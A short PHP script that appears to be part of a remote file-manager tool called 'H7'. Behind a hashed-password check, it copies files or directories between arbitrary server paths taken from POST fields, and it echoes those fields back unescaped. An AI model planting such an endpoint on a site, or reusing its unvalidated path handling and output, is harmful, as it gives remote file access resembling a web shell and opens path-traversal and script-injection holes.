<?php /*12.01.2017
0 h7id ответа
1 - url
2 - urlnew
*/
if(!file_exists('./p.php')){exit('H7 pass not exist');}else{
if('<? /*'.md5($_POST['p']).'*/ ?>'!=file_get_contents('./p.php')){exit('H7 pass no');}}

if(!isset($_POST['r1'])){exit('X<h7>'.$_POST['r0'].'<h7>COPY not url');}
if(!isset($_POST['r2'])){exit('X<h7>'.$_POST['r0'].'<h7>COPY not url_new');}

if(!file_exists($_POST['r1'])){exit('X<h7>'.$_POST['r0'].'<h7>COPY url not exist '.$_POST['r1']);}
if(file_exists($_POST['r2'])){exit('X<h7>'.$_POST['r0'].'<h7>COPY url_new exist '.$_POST['r2']);}


function recurse_copy($src,$dst) { 
    $dir = opendir($src); 
    @mkdir($dst); 
    while(false !== ( $file = readdir($dir)) ) { 
        if (( $file != '.' ) && ( $file != '..' )) { 
            if ( is_dir($src . '/' . $file) ) { 
                recurse_copy($src . '/' . $file,$dst . '/' . $file); 
            } 
            else { 
                copy($src . '/' . $file,$dst . '/' . $file); 
            } 
        } 
    } 
    closedir($dir); 
} 


if(is_dir($_POST['r1'])){
	recurse_copy($_POST['r1'],$_POST['r2']);
}else{
	copy($_POST['r1'],$_POST['r2']);
}


if(file_exists($_POST['r2'])){
    echo 'V';
}else{
    echo 'X';
}


echo '<h7>'.$_POST['r0'].'<h7>COPY '.$_POST['r1'].' '.$_POST['r2'];




?>